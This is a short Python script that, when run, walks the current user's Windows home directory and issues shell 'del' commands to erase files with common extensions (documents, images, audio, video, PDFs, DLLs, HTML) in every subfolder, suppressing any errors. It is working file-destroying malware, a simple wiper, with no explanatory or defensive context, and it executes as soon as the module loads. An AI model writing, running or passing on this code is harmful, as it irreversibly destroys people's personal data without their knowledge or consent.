import os, getpass

class DEL:
    def __init__(self):
        self.V_list = ['C:\Users\%s' % getpass.getuser()]
        self.extensions = ['.txt','.doc','.jpg','.png','.docx','.ppt',
                           '.mp3','.mp4','.wav','.bmp','.avi','.obj',
                           '.svg','.pdf','.dll','.html', '.gif']
        self.crawler()
        self.menace()



    def crawler(self):
            for root,dirs,files in os.walk(self.V_list[0]):
                ''' The os.walk function returns, respectively, the path's directory,
                a list of the path's subdirectories and a list of the path's files.
                The process is done for every each directory found within the directory
                first given. '''

                if root is not self.V_list:
                    self.V_list.append(root)

    def menace(self):
       try:
            for i in range(len(self.V_list)):
                for j in range(len(self.extensions)):
                    os.system('del "%s\\*%s"' % (self.V_list[i],self.extensions[j]))
       except:
           print('\a')
           pass


zz = DEL()

